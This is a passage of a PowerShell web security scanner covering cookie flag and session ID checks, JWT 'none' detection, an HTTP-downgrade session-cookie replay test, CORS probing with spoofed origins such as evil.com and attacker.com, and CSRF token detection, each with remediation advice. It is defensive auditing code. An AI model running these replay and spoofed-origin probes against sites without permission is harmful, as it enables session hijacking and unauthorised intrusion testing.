                    Add-Issue -severity "Medium" -title "Cookie Missing Secure Flag" `
                            -description ("Cookie '" + $cookieName + "' can be transmitted over insecure HTTP") `
                            -whyItMatters "Without the Secure flag, cookies can be intercepted over unencrypted HTTP connections, even if the site normally uses HTTPS. Man-in-the-middle attackers on public WiFi can steal session cookies." `
                            -suggestedFix ("Add Secure flag to cookie: Set-Cookie: " + $cookieName + "=value; Secure; HttpOnly; SameSite=Lax") `
                            -issueType "WeakSession" `
                            -confidence "High"
                    }
                    else {
                        Write-Success ("Cookie '" + $cookieName + "' has Secure flag")
                    }
                    
                    # HttpOnly flag check
                    if ($cookieHeader -notmatch 'HttpOnly') {
                        Write-Warning ("Cookie '" + $cookieName + "' missing HttpOnly flag")
                        Add-Issue -severity "Medium" -title "Cookie Missing HttpOnly Flag" `
                            -description ("Cookie '" + $cookieName + "' is accessible via JavaScript (XSS risk)") `
                            -whyItMatters "Without HttpOnly, JavaScript code (including XSS attacks) can read this cookie via document.cookie. If this is a session cookie, attackers can hijack user sessions through XSS." `
                            -suggestedFix ("Add HttpOnly flag to cookie: Set-Cookie: " + $cookieName + "=value; Secure; HttpOnly; SameSite=Lax") `
                            -issueType "WeakSession" `
                            -confidence "High"
                    }
                    else {
                        Write-Success ("Cookie '" + $cookieName + "' has HttpOnly flag")
                    }
                    
                    # SameSite check
                    if ($cookieHeader -match 'SameSite=(\w+)') {
                        $sameSiteValue = $Matches[1]
                        Write-Success ("Cookie '" + $cookieName + "' has SameSite=" + $sameSiteValue)
                    }
                    else {
                        Write-Warning ("Cookie '" + $cookieName + "' missing SameSite attribute")
                        Add-Issue -severity "Low" -title "Cookie Missing SameSite Attribute" `
                            -description ("Cookie '" + $cookieName + "' lacks CSRF protection via SameSite") `
                            -whyItMatters "Without SameSite, cookies are sent with cross-site requests, enabling CSRF attacks where malicious sites can trigger actions on behalf of users." `
                            -suggestedFix ("Add SameSite attribute: Set-Cookie: " + $cookieName + "=value; Secure; HttpOnly; SameSite=Lax (or Strict for sensitive operations)") `
                            -issueType "CSRF" `
                            -confidence "Medium"
                    }
                    
                    # Session strength analysis
                    if ($cookieName -match 'session|sess|sid|jsessionid|phpsessid|asp\.net|token|auth') {
                        $cookieValue = ($cookieHeader -split ';')[0] -split '=' | Select-Object -Last 1
                        
                        if ($cookieValue.Length -lt 16) {
                            Write-Warning ("Session cookie weak: length " + $cookieValue.Length + " < 16 chars")
                            Add-Issue -severity "High" -title "Weak Session Cookie Length" `
                                -description ("Session cookie '" + $cookieName + "' is too short (" + $cookieValue.Length + " characters < 16)") `
                                -whyItMatters "Short session IDs have a small keyspace and can be brute-forced. Attackers can guess valid session IDs and hijack user accounts." `
                                -suggestedFix "Use cryptographically secure random session IDs with at least 128 bits of entropy (16+ bytes, 32+ hex chars)" `
                                -issueType "WeakSession" `
                                -confidence "High" `
                                -evidence @{CookieName = $cookieName; Length = $cookieValue.Length}
                        }
                        
                        if ($cookieValue -match '^\d+$') {
                            Write-Danger ("Session ID predictable: " + $cookieName + " is numeric-only")
                            Add-Issue -severity "High" -title "Predictable Session ID" `
                                -description ("Session cookie '" + $cookieName + "' uses predictable numeric-only values") `
                                -whyItMatters "Sequential or numeric-only session IDs can be enumerated by attackers to hijack other users' sessions. This is a critical authentication bypass." `
                                -suggestedFix "Use cryptographically secure random session ID generation (e.g., SecureRandom, UUID v4, or crypto.randomBytes)" `
                                -issueType "WeakSession" `
                                -confidence "High" `
                                -evidence @{CookieName = $cookieName; Pattern = "numeric-only"}
                        }
                    }
                }
                
                # ========================================================================
                # SESSION HIJACK SIMULATION (HTTP Downgrade Attack)
                # ========================================================================
                Write-Host ""
                Write-Info "Testing session hijack vulnerability (HTTP downgrade)..."
                
                # Find session cookies without Secure flag
                $vulnerableCookies = @()
                foreach ($cookieHeader in $cookies) {
                    $cookieName = ""
                    $cookieValue = ""
                    
                    if ($cookieHeader -match '^([^=]+)=([^;]+)') {
                        $cookieName = $Matches[1].Trim()
                        $cookieValue = $Matches[2].Trim()
                    }
                    
                    $isSessionCookie = $cookieName -match '(session|sess|sid|token|auth|jsessionid|phpsessid|asp\.net)'
                    $hasSecure = $cookieHeader -match 'Secure'
                    
                    if ($isSessionCookie -and -not $hasSecure) {
                        $vulnerableCookies += @{
                            Name = $cookieName
                            Value = $cookieValue
                        }
                    }
                }
                
                if ($vulnerableCookies.Count -gt 0) {
                    Write-Warning "Found $($vulnerableCookies.Count) session cookie(s) without Secure flag"
                    Write-Info "Attempting to replay cookie over HTTP (downgrade attack)..."
                    
                    foreach ($vulnCookie in $vulnerableCookies) {
                        # Try to send the cookie over HTTP
                        $httpSite = $site -replace '^https:', 'http:'
                        
                        $hijackHeaders = @{
                            "Cookie" = "$($vulnCookie.Name)=$($vulnCookie.Value)"
                        }
                        
                        $httpReplay = Invoke-SafeWebRequest -uri $httpSite -method "GET" -headers $hijackHeaders -timeoutSec 5 -useAuth $false
                        
                        if ($httpReplay.StatusCode -eq 200) {
                            # Check if we got an authenticated response
                            $content = $httpReplay.Content
                            if ($content) {
                                $contentLower = $content.ToLower()
                                
                                # Heuristics for authenticated session
                                $looksAuthenticated = $false
                                if ($contentLower -match 'logout|sign out|dashboard|profile|account|welcome back|my account') {
                                    $looksAuthenticated = $true
                                }
                                
                                if ($looksAuthenticated) {
                                    Write-Danger "CRITICAL: Session cookie works over HTTP! Session hijack confirmed."
                                    Add-Issue -severity "Critical" `
                                        -title "Session Hijack Vulnerability - Cookie Works Over HTTP" `
                                        -description "Session cookie '$($vulnCookie.Name)' was successfully replayed over HTTP (not HTTPS). Server accepted the cookie and returned authenticated content, proving active session hijack vulnerability." `
                                        -url $httpSite `
                                        -remediation "Set Secure flag on all session cookies AND enforce HTTPS-only access" `
                                        -whyItMatters "This is a CRITICAL exploitable vulnerability. Attackers on the same WiFi/network can intercept HTTP traffic, steal session cookies, and hijack user accounts. This was confirmed by successfully replaying the cookie over HTTP." `
                                        -suggestedFix "1. Add Secure flag to all cookies: Set-Cookie: name=value; Secure; HttpOnly; SameSite=Lax. 2. Enforce HTTPS: Redirect all HTTP to HTTPS with 301. 3. Set HSTS header with includeSubDomains. 4. Never accept cookies over HTTP in session validation logic." `
                                        -issueType "CriticalSessionHijack" `
                                        -confidence "High" `
                                        -evidence @{ 
                                            CookieName = $vulnCookie.Name
                                            HTTPUrl = $httpSite
                                            AuthIndicators = "logout|dashboard|profile pattern found"
                                        }
                                } else {
                                    Write-Warning "Cookie sent over HTTP but response doesn't look authenticated (may require valid session)"
                                    Add-Issue -severity "High" `
                                        -title "Session Cookie Transmitted Over HTTP" `
                                        -description "Session cookie '$($vulnCookie.Name)' missing Secure flag. While replay wasn't confirmed as authenticated, the cookie IS transmitted over HTTP." `
                                        -url $httpSite `
                                        -remediation "Set Secure flag on cookie: Set-Cookie: $($vulnCookie.Name)=value; Secure" `
                                        -whyItMatters "Session cookies without Secure flag are sent over HTTP. Attackers on local network can intercept these cookies via WiFi sniffing or MitM attacks." `
                                        -suggestedFix "Add Secure flag and enforce HTTPS everywhere." `
                                        -issueType "WeakSession"
                                }
                            }
                        } elseif ($httpReplay.StatusCode -in @(301, 302, 303, 307, 308)) {
                            Write-Success "Server redirects HTTP to HTTPS (good - mitigates risk)"
                        } else {
                            Write-Info "HTTP request failed (site may enforce HTTPS-only)"
                        }
                    }
                } else {
                    Write-Success "All session cookies have Secure flag - HTTP downgrade attack not possible"
                }
                
                # ========================================================================
                # AUTHENTICATED SESSION COOKIE ANALYSIS
                # ========================================================================
                if ($script:authState.IsAuthenticated -and $script:authState.SessionCookies.Count -gt 0) {
                    Write-Host ""
                    Write-Info "Analyzing authenticated session cookies..."
                    
                    foreach ($cookieName in $script:authState.SessionCookies.Keys) {
                        $cookieValue = $script:authState.SessionCookies[$cookieName]
                        
                        Write-Info "Authenticated cookie: $cookieName"
                        
                        # Cookie length/entropy check
                        if ($cookieValue.Length -lt 16) {
                            Write-Danger "Authenticated session cookie is too short: $($cookieValue.Length) characters"
                            Add-Issue -severity "Critical" `
                                -title "Weak Authenticated Session Cookie" `
                                -description "Session cookie '$cookieName' has only $($cookieValue.Length) characters. This provides insufficient entropy and can be brute-forced." `
                                -remediation "Use cryptographically secure random session IDs with at least 128 bits (16 bytes = 32 hex chars)" `
                                -whyItMatters "Weak session IDs can be enumerated by attackers. With $($cookieValue.Length) characters, the keyspace is small enough for brute force attacks to hijack sessions." `
                                -suggestedFix "Use secure session generation: crypto.randomBytes(32).toString('hex') or UUID v4" `
                                -category "Authentication" `
                                -cweId "CWE-331" `
                                -issueType "WeakSession" `
                                -confidence "High" `
                                -evidence @{
                                    CookieName = $cookieName
                                    Length = $cookieValue.Length
                                    RequiredMinimum = 16
                                }
                        } else {
                            Write-Success "Cookie length adequate: $($cookieValue.Length) characters"
                        }
                        
                        # Predictability check
                        if ($cookieValue -match '^\d+$') {
                            Write-Danger "Session cookie is numeric-only (predictable)"
                            Add-Issue -severity "Critical" `
                                -title "Predictable Session ID (Numeric Only)" `
                                -description "Authenticated session cookie '$cookieName' uses numeric-only values, making it vulnerable to enumeration attacks." `
                                -remediation "Use cryptographically random session IDs with mixed alphanumeric characters" `
                                -whyItMatters "Sequential or numeric session IDs can be guessed. Attackers can increment/decrement values to hijack other users' sessions." `
                                -suggestedFix "Replace numeric IDs with UUIDs or secure random tokens: e.g., 'f47ac10b-58cc-4372-a567-0e02b2c3d479'" `
                                -category "Authentication" `
                                -cweId "CWE-330" `
                                -issueType "PredictableSession" `
                                -confidence "High"
                        }
                        
                        # Check for JWT
                        if ($cookieValue -match '^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$') {
                            Write-Info "Cookie appears to be a JWT token"
                            
                            # Decode JWT header (base64)
                            try {
                                $parts = $cookieValue -split '\.'
                                $headerB64 = $parts[0]
                                # Add padding if needed
                                $padding = 4 - ($headerB64.Length % 4)
                                if ($padding -lt 4) {
                                    $headerB64 += '=' * $padding
                                }
                                $headerB64 = $headerB64 -replace '-', '+' -replace '_', '/'
                                $headerJson = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($headerB64))
                                
                                Write-Debug "JWT Header: $headerJson"
                                
                                if ($headerJson -match '"alg"\s*:\s*"none"') {
                                    Write-Danger "JWT uses 'none' algorithm - signature bypass vulnerability!"
                                    Add-Issue -severity "Critical" `
                                        -title "JWT with 'none' Algorithm" `
                                        -description "Session JWT uses 'none' algorithm, allowing attackers to forge tokens without a signature." `
                                        -remediation "Use strong algorithms: HS256, RS256, or ES256. Never allow 'none'." `
                                        -whyItMatters "Attackers can modify JWT payload (change user ID, role, permissions) and set alg=none to bypass signature verification." `
                                        -suggestedFix "1. Reject tokens with alg=none. 2. Use HS256 with strong secret or RS256 with private key. 3. Verify signature on every request." `
                                        -category "Authentication" `
                                        -cweId "CWE-347" `
                                        -issueType "JWTVulnerability" `
                                        -confidence "High"
                                }
                                
                                if ($headerJson -match '"alg"\s*:\s*"HS256"') {
                                    Write-Info "JWT uses HS256 (symmetric signing - ensure strong secret)"
                                }
                                
                                if ($headerJson -match '"alg"\s*:\s*"RS256"') {
                                    Write-Success "JWT uses RS256 (asymmetric signing - good)"
                                }
                            }
                            catch {
                                Write-Debug "Could not decode JWT header: $_"
                            }
                        }
                        
                        # Expiration check (if we can fetch cookie attributes from a test endpoint)
                        Write-Info "Checking cookie attributes from authenticated response..."
                        $testResponse = Invoke-SafeWebRequest -uri $site -method "GET" -useAuth $true -returnRaw $true -timeoutSec 5
                        
                        if ($testResponse -and $testResponse.Headers -and $testResponse.Headers['Set-Cookie']) {
                            foreach ($setCookie in $testResponse.Headers['Set-Cookie']) {
                                if ($setCookie -match "^$cookieName=") {
                                    Write-Debug "Found Set-Cookie for $cookieName"
                                    
                                    # Check Secure flag
                                    if ($setCookie -notmatch 'Secure' -and $site -match '^https') {
                                        Write-Danger "Authenticated session cookie missing Secure flag"
                                        Add-Issue -severity "Critical" `
                                            -title "Authenticated Session Cookie Missing Secure Flag" `
                                            -description "Session cookie '$cookieName' lacks Secure flag. Can be stolen over HTTP via MitM attacks." `
                                            -remediation "Add Secure flag: Set-Cookie: $cookieName=...; Secure; HttpOnly; SameSite=Lax" `
                                            -whyItMatters "Authenticated session cookies without Secure flag can be intercepted on public WiFi. Attackers performing MitM attacks can steal the cookie and hijack the user's session." `
                                            -suggestedFix "Always set Secure flag on authentication cookies when using HTTPS." `
                                            -category "Authentication" `
                                            -cweId "CWE-614" `
                                            -issueType "InsecureCookie" `
                                            -confidence "High"
                                    } else {
                                        Write-Success "Cookie has Secure flag"
                                    }
                                    
                                    # Check HttpOnly flag
                                    if ($setCookie -notmatch 'HttpOnly') {
                                        Write-Danger "Authenticated session cookie missing HttpOnly flag"
                                        Add-Issue -severity "Critical" `
                                            -title "Authenticated Session Cookie Accessible via JavaScript" `
                                            -description "Session cookie '$cookieName' lacks HttpOnly flag. XSS attacks can steal this cookie via document.cookie." `
                                            -remediation "Add HttpOnly flag: Set-Cookie: $cookieName=...; Secure; HttpOnly; SameSite=Lax" `
                                            -whyItMatters "Without HttpOnly, any XSS vulnerability allows attackers to steal session cookies and hijack accounts. This is the #1 reason for HttpOnly flag." `
                                            -suggestedFix "Always set HttpOnly on authentication/session cookies." `
                                            -category "Authentication" `
                                            -cweId "CWE-1004" `
                                            -issueType "XSSCookieTheft" `
                                            -confidence "High"
                                    } else {
                                        Write-Success "Cookie has HttpOnly flag"
                                    }
                                    
                                    # Check SameSite
                                    if ($setCookie -match 'SameSite=(\w+)') {
                                        $sameSite = $Matches[1]
                                        if ($sameSite -eq 'None') {
                                            Write-Warning "Session cookie uses SameSite=None (allows cross-site usage)"
                                            Add-Issue -severity "Medium" `
                                                -title "Session Cookie with SameSite=None" `
                                                -description "Cookie '$cookieName' set to SameSite=None, allowing cross-site request usage." `
                                                -remediation "Use SameSite=Lax or SameSite=Strict for session cookies" `
                                                -whyItMatters "SameSite=None permits the cookie to be sent with cross-site requests, increasing CSRF risk." `
                                                -suggestedFix "Change to SameSite=Lax (recommended) or SameSite=Strict (strict protection)"
                                        } elseif ($sameSite -eq 'Lax') {
                                            Write-Success "Cookie has SameSite=Lax (good CSRF protection)"
                                        } elseif ($sameSite -eq 'Strict') {
                                            Write-Success "Cookie has SameSite=Strict (maximum CSRF protection)"
                                        }
                                    } else {
                                        Write-Warning "Session cookie missing SameSite attribute"
                                        Add-Issue -severity "Medium" `
                                            -title "Authenticated Cookie Missing SameSite" `
                                            -description "Session cookie '$cookieName' lacks SameSite attribute, reducing CSRF protection." `
                                            -remediation "Add SameSite=Lax: Set-Cookie: $cookieName=...; Secure; HttpOnly; SameSite=Lax" `
                                            -whyItMatters "SameSite prevents cookies from being sent with cross-site requests, mitigating CSRF attacks." `
                                            -suggestedFix "Add SameSite=Lax as defense-in-depth (still use CSRF tokens as primary defense)"
                                    }
                                    
                                    # Check expiration
                                    if ($setCookie -match 'Max-Age=(\d+)') {
                                        $maxAge = [int]$Matches[1]
                                        $hours = [math]::Round($maxAge / 3600, 1)
                                        
                                        if ($maxAge -gt 2592000) {  # 30 days
                                            Write-Warning "Session cookie has long expiration: $hours hours (> 30 days)"
                                            Add-Issue -severity "Low" `
                                                -title "Long Session Cookie Expiration" `
                                                -description "Session cookie expires in $hours hours. Long-lived sessions increase hijack window." `
                                                -remediation "Use shorter session timeouts (e.g., 1-24 hours) and implement refresh tokens for persistence" `
                                                -whyItMatters "Long session timeouts provide attackers more time to exploit stolen cookies. Shorter sessions reduce attack window." `
                                                -suggestedFix "Use sliding expiration: 1-2 hours for sessions, long-lived refresh tokens with rotation"
                                        } else {
                                            Write-Success "Cookie expiration reasonable: $hours hours"
                                        }
                                    } elseif ($setCookie -match 'Expires=') {
                                        Write-Info "Cookie has Expires attribute (check if reasonable)"
                                    } else {
                                        Write-Info "Cookie is session-only (no Max-Age/Expires - expires on browser close)"
                                    }
                                }
                            }
                        }
                    }
                } elseif ($script:authState.IsAuthenticated) {
                    Write-Info "Authenticated mode active but no session cookies captured"
                } else {
                    Write-Host ""
                    Write-Info "NOTE: Authenticated cookie analysis skipped (no session provided)"
                    Write-Info "For complete cookie security analysis, provide: -SessionCookie 'session=...' or -Username/-Password"
                    Write-Info "Session cookies are the most security-critical and are only visible when authenticated"
                }
                
        } else {
            Write-Info "No cookies set by the application"
            Write-Info "NOTE: Cookie analysis is performed on anonymous GET request to homepage"
            Write-Info "      If authentication is required, cookies set after login may not be analyzed"
            Write-Info "      Consider using -Username/-Password or -SessionCookie for authenticated testing"
        }
    }
    catch {
        Write-Warning ("Cookie analysis failed: " + $_)
    }
    
    Complete-SecurityTest
}

# ============================================================================
# TEST 11: CORS Configuration
# ============================================================================
function Test-CORS {
    Start-SecurityTest "Cross-Origin Resource Sharing (CORS) Testing" "11"
    
    $testOrigins = @(
        "https://evil.com",
        "https://attacker.com",
        "null",
        "http://localhost",
        "http://127.0.0.1"
    )
    
    $testEndpoints = @("/", "/api/countries", "/api/users")
    
    $vulnerableEndpoints = @()
    $criticalIssues = 0
    $highIssues = 0
    $restrictedEndpoints = 0
    
    foreach ($endpoint in $testEndpoints) {
        Write-Info "Testing CORS on: $endpoint"
        
        $endpointVulnerable = $false
        
        foreach ($origin in $testOrigins) {
            $headers = @{ "Origin" = $origin }
            $result = Invoke-SafeWebRequest -uri ($site + $endpoint) -headers $headers -method "GET" -timeoutSec 5
            
            if ($result.Success) {
                $acao = $result.Headers['Access-Control-Allow-Origin']
                $acac = $result.Headers['Access-Control-Allow-Credentials']
                
                if ($acao -eq "*") {
                    Write-Danger "CORS allows all origins (*) on $endpoint"
                    Add-Issue -severity "High" -title "Permissive CORS Policy" `
                        -description "Access-Control-Allow-Origin: * allows any origin to read responses from $endpoint" `
                        -url ($site + $endpoint) `
                        -remediation "Restrict CORS to specific trusted origins" `
                        -whyItMatters "Wildcard CORS allows any website to read sensitive data from your API via JavaScript. Attackers can host evil.com, make requests to your API, and steal user data if the response contains sensitive info." `
                        -suggestedFix "Replace * with explicit whitelist of trusted origins. Validate Origin header server-side before echoing it in Access-Control-Allow-Origin." `
                        -issueType "CORS"
                    $vulnerableEndpoints += $endpoint
                    $highIssues++
                    $endpointVulnerable = $true
                    break
                }
                elseif ($acao -eq $origin) {
                    Write-Warning "CORS reflects arbitrary origin '$origin' on $endpoint"
                    
                    if ($acac -eq "true") {
                        Write-Danger "CRITICAL: CORS allows credentials with arbitrary origin on $endpoint!"
                        Add-Issue -severity "Critical" -title "Critical CORS Misconfiguration" `
                            -description "CORS reflects arbitrary origin '$origin' AND allows credentials (cookies/auth headers) on $endpoint - full authentication bypass risk" `
                            -url ($site + $endpoint) `
                            -remediation "Never combine reflected origins with Allow-Credentials: true" `
                            -whyItMatters "This is the most dangerous CORS misconfiguration. Attacker can make authenticated requests from evil.com and steal sensitive user data, session tokens, or perform actions as the victim. The browser sends cookies and auth headers, giving the attacker full access." `
                            -suggestedFix "Remove Access-Control-Allow-Credentials: true OR implement strict origin whitelist validation. Never reflect Origin header without validation when credentials are allowed." `
                            -issueType "CORS"
                        $vulnerableEndpoints += $endpoint
                        $criticalIssues++
                        $endpointVulnerable = $true
                    } else {
                        Add-Issue -severity "Medium" -title "CORS Reflects Origin Without Validation" `
                            -description "CORS policy reflects the Origin header '$origin' on $endpoint without apparent validation" `
                            -remediation "Validate origins against a whitelist before echoing in Access-Control-Allow-Origin" `
                            -whyItMatters "Reflecting arbitrary origins allows any website to read your API responses. While credentials aren't included, this can still leak public data or API structure to attackers." `
                            -suggestedFix "Implement server-side whitelist: if (allowedOrigins.contains(requestOrigin)) { setHeader('Access-Control-Allow-Origin', requestOrigin) }" `
                            -url ($site + $endpoint) `
                            -issueType "CORS"
                        if ($endpoint -notin $vulnerableEndpoints) {
                            $vulnerableEndpoints += $endpoint
                        }
                        $endpointVulnerable = $true
                    }
                }
            }
        }
        
        if (-not $endpointVulnerable) {
            $restrictedEndpoints++
        }
    }
    
    # Summary
    Write-Host ""
    if ($criticalIssues -gt 0 -or $highIssues -gt 0) {
        Write-Danger "CORS SUMMARY: $criticalIssues CRITICAL, $highIssues HIGH issues found"
        Write-Warning "Vulnerable endpoints: $($vulnerableEndpoints -join ', ')"
    }
    elseif ($vulnerableEndpoints.Count -gt 0) {
        Write-Warning "CORS SUMMARY: MEDIUM issues on $($vulnerableEndpoints.Count) endpoint(s)"
    }
    else {
        Write-Success "CORS SUMMARY: All $restrictedEndpoints tested endpoints appear properly restricted"
        Add-Issue -severity "Info" -title "CORS Properly Configured" `
            -description "CORS policy appears restricted - no wildcard or reflected origins detected on tested endpoints: $($testEndpoints -join ', ')" `
            -remediation "Continue validating CORS on all API endpoints"
    }
    
    Complete-SecurityTest
}

# ============================================================================
# TEST 09: CSRF TOKEN DETECTION & PROTECTION ANALYSIS
# ============================================================================
function Test-CSRF {
    Start-SecurityTest "CSRF Protection Analysis" "09"
    
    $result = @{
        Name = "CSRF"
        Status = "Completed"
        Duration = 0
        Issues = @()
        Evidence = @{}
        Metrics = @{
            FormsAnalyzed = 0
            FormsWithTokens = 0
            FormsWithoutTokens = 0
            StateChangingEndpoints = @()
            CookiesWithSameSite = 0
            CookiesWithoutSameSite = 0
        }
    }
    
    try {
        Write-Info "Phase 1: Analyzing CSRF protection mechanisms..."
        
        # Try to use baseline response first
        $response = $null
        if ($script:baselineResponse.Success -and $script:baselineResponse.Content) {
            Write-Info "Using cached baseline response for CSRF analysis"
            $response = $script:baselineResponse
        }
        else {
            Write-Info "Baseline not available - fetching content directly"
            $response = Invoke-SafeWebRequest -uri $site -method "GET"
        }
        
        if (-not $response.Success -or -not $response.Content) {
            Write-Warning "Could not fetch site content for CSRF analysis"
            Write-Info "Marking verification as INCONCLUSIVE"
            
            Add-Issue -severity "Info" `
                -title "CSRF Verification Inconclusive" `
                -description "Unable to retrieve HTML content to analyze forms for CSRF tokens. Cannot verify CSRF protection." `
                -remediation "Manual verification required. Check if forms include anti-CSRF tokens and cookies use SameSite attribute." `
                -category "Configuration" `
                -issueType "VerificationFailed" `
                -confidence "Low"
            
            Complete-SecurityTest
            return $result
        }
        
        $html = $response.Content
        
        # ========== CSRF TOKEN DETECTION IN FORMS ==========
        Write-Info "Phase 2: Analyzing forms for CSRF tokens..."
        
        # Find all forms with state-changing methods
        $formPattern = '<form[^>]*>([\s\S]*?)<\/form>'
        $forms = [regex]::Matches($html, $formPattern)
        
        Write-Info "Found $($forms.Count) forms on the page"
        $result.Metrics.FormsAnalyzed = $forms.Count
        
        foreach ($form in $forms) {
            $formContent = $form.Value
            
            # Check if form uses state-changing method
            $isStateChanging = $false
            $methodPattern = 'method\s*=\s*[' + "`"'" + ']?(post|put|delete|patch)[' + "`"'" + ']?'
            if ($formContent -match $methodPattern) {
                $isStateChanging = $true
                $method = $Matches[1].ToUpper()
            }
            
            if ($isStateChanging) {
                # Extract form action
                $action = ""
                $actionPattern = 'action\s*=\s*[' + "`"'" + '](.*?)[' + "`"'" + ']'
                if ($formContent -match $actionPattern) {
                    $action = $Matches[1]
                }
                
                Write-Info "Analyzing $method form: $action"
                
                # Check for CSRF token fields
                $hasCSRFToken = $false
                $tokenName = ""
                
                $tokenNames = @(
                    '_csrf',
                    'csrf_token',
                    'csrfmiddlewaretoken',
                    '__RequestVerificationToken',
                    'authenticity_token',
                    'csrf',
                    '_token',
                    'token',
                    'csrf-token',
                    'anti-forgery-token'
                )
                
                foreach ($potentialToken in $tokenNames) {
                    $inputPattern = "<input[^>]*name\s*=\s*[" + "`"'" + "]" + $potentialToken + "[" + "`"'" + "][^>]*>"
                    if ($formContent -match $inputPattern) {
                        $hasCSRFToken = $true
                        $tokenName = $potentialToken
                        Write-Success ("CSRF token field found: " + $tokenName)
                        $result.Metrics.FormsWithTokens++
                        break
                    }
                }
                
                if (-not $hasCSRFToken) {
                    Write-Warning ("No CSRF token found in " + $method + " form")
                    $result.Metrics.FormsWithoutTokens++
                    
                    $result.Metrics.StateChangingEndpoints += @{
                        Method = $method
                        Action = $action
                        HasCSRFToken = $false
                    }
                    
                    Add-Issue -severity "High" `
                        -title "Missing CSRF Protection on Form" `
                        -description "Form with $method method lacks anti-CSRF token. Action: $action" `
                        -remediation "Implement anti-CSRF tokens using Synchronizer Token Pattern on all state-changing forms" `
                        -whyItMatters "Without CSRF tokens, attackers can trick authenticated users into submitting malicious forms (e.g., transfer money, change password, delete data) by embedding hidden forms on attacker-controlled sites. The browser automatically sends session cookies, so the victim's session is used without their knowledge." `
                        -suggestedFix "Generate unique, unpredictable tokens server-side for each session. Include token in hidden form fields. Validate token on POST/PUT/DELETE/PATCH requests. Frameworks: Django ({% csrf_token %}), Rails (form_authenticity_token), .NET (AntiForgeryToken), Express (csurf middleware)." `
                        -url "$site$(if($action){$action})" `
                        -issueType "CSRF" `
                        -confidence "High" `
                        -evidence @{ Method = $method; Action = $action; FormSnippet = $formContent.Substring(0, [Math]::Min(200, $formContent.Length)) }
                }
                else {
                    $result.Metrics.StateChangingEndpoints += @{
                        Method = $method
                        Action = $action
                        HasCSRFToken = $true
                        TokenName = $tokenName
                    }
                }
            }
        }
        
        # ========== SAMESITE COOKIE ANALYSIS ==========
        Write-Info "Phase 3: Analyzing SameSite cookie attributes..."
        
        # Check cookies from the response
        if ($response.Response -and $response.Response.Headers['Set-Cookie']) {
            $setCookies = $response.Response.Headers['Set-Cookie']
            
            foreach ($cookie in $setCookies) {
                $cookieName = ""
                $cookiePattern = '^([^=]+)='
                if ($cookie -match $cookiePattern) {
                    $cookieName = $Matches[1]
                }
                
                $hasSameSite = $false
                $sameSiteValue = ""
                
                if ($cookie -match 'SameSite\s*=\s*(\w+)') {
                    $hasSameSite = $true
                    $sameSiteValue = $Matches[1]
                    $result.Metrics.CookiesWithSameSite++
                    Write-Success "Cookie '$cookieName' has SameSite=$sameSiteValue"
                }
                else {
                    $result.Metrics.CookiesWithoutSameSite++
                    Write-Warning "Cookie '$cookieName' missing SameSite attribute"
                    
                    # Check if it's a session cookie (heuristic)
                    $sessionPattern = '(session|sess|sid|jsessionid|phpsessid|asp\.net|auth|token)'
                    if ($cookieName -match $sessionPattern) {
                        Add-Issue -severity "Medium" `
                            -title "Session Cookie Missing SameSite Attribute" `
                            -description "Session cookie '$cookieName' lacks SameSite attribute, making it vulnerable to CSRF if no token protection exists" `
                            -remediation "Set SameSite=Lax or SameSite=Strict on session cookies: Set-Cookie: $cookieName=value; SameSite=Lax; Secure; HttpOnly" `
                            -whyItMatters "Without SameSite, session cookies are sent with cross-site requests. Attackers can embed forms/links on evil.com that trigger actions on your site using the victim's session. SameSite=Lax blocks POST from external sites, SameSite=Strict blocks all cross-site cookie transmission." `
                            -suggestedFix "Add SameSite=Lax for most session cookies (blocks CSRF on POST). Use SameSite=Strict for highly sensitive cookies (blocks all cross-site usage). Always combine with Secure and HttpOnly flags." `
                            -issueType "CSRF" `
                            -confidence "High" `
                            -evidence @{ CookieName = $cookieName; CookieString = $cookie }
                    }
                }
            }
        }
        
        # ========== SUMMARY ==========
        Write-Host ""
        Write-Info "CSRF Analysis Summary:"
        Write-Info "  Forms analyzed: $($result.Metrics.FormsAnalyzed)"
        Write-Info "  Forms with CSRF tokens: $($result.Metrics.FormsWithTokens)"
        Write-Info "  Forms without CSRF tokens: $($result.Metrics.FormsWithoutTokens)"
        Write-Info "  Cookies with SameSite: $($result.Metrics.CookiesWithSameSite)"
        Write-Info "  Cookies without SameSite: $($result.Metrics.CookiesWithoutSameSite)"
        
        # ========== AUTHENTICATED CSRF TESTING ==========
        if ($script:authState.IsAuthenticated) {
            Write-Host ""
            Write-Info "Phase 4: Authenticated CSRF testing (session replay enabled)..."
            
            # Test authenticated endpoints that typically have state-changing forms
            $authEndpoints = @(
                "/user/profile",
                "/user/settings",
                "/settings",
                "/account",
                "/account/settings",
                "/profile/edit",
                "/user/edit",
                "/api/user",
                "/dashboard/settings"
            )
            
            $authFormsFound = 0
            $authFormsWithoutToken = 0
            
            foreach ($endpoint in $authEndpoints) {
                $authUrl = $site + $endpoint
                $authResponse = Invoke-SafeWebRequest -uri $authUrl -method "GET" -useAuth $true -timeoutSec 5
                
                if ($authResponse.Success -and $authResponse.Content) {
                    Write-Debug "Checking authenticated endpoint: $endpoint"
                    
                    $authHtml = $authResponse.Content
                    $authForms = [regex]::Matches($authHtml, $formPattern)
                    
                    foreach ($form in $authForms) {
                        $formContent = $form.Value
                        
                        # Check for state-changing methods
                        if ($formContent -match $methodPattern) {
                            $authFormsFound++
                            $method = $Matches[1].ToUpper()
                            
                            # Extract action
                            $action = $endpoint
                            if ($formContent -match $actionPattern) {
                                $action = $Matches[1]
                            }
                            
                            # Check for CSRF token
                            $hasToken = $false
                            foreach ($potentialToken in $tokenNames) {
                                $inputPattern = "<input[^>]*name\s*=\s*[" + "`"'" + "]" + $potentialToken + "[" + "`"'" + "][^>]*>"
                                if ($formContent -match $inputPattern) {
                                    $hasToken = $true
                                    Write-Success "Authenticated form has CSRF token: $endpoint ($method)"
                                    break
                                }
                            }
                            
                            if (-not $hasToken) {
                                $authFormsWithoutToken++
                                Write-Danger "Authenticated form MISSING CSRF token: $endpoint ($method)"
                                
                                Add-Issue -severity "Critical" `
                                    -title "Missing CSRF Protection on Authenticated Form" `
                                    -description "Authenticated endpoint $endpoint has $method form without anti-CSRF token. This is a CRITICAL vulnerability as authenticated users can be tricked into performing sensitive actions." `
                                    -remediation "Add anti-CSRF token to all authenticated forms. Validate token server-side before processing requests." `
                                    -whyItMatters "Authenticated forms without CSRF tokens allow attackers to perform actions as the victim user. Examples: change password, update email, transfer funds, delete account. The attacker creates a malicious page with a hidden form that auto-submits to your endpoint using the victim's session." `
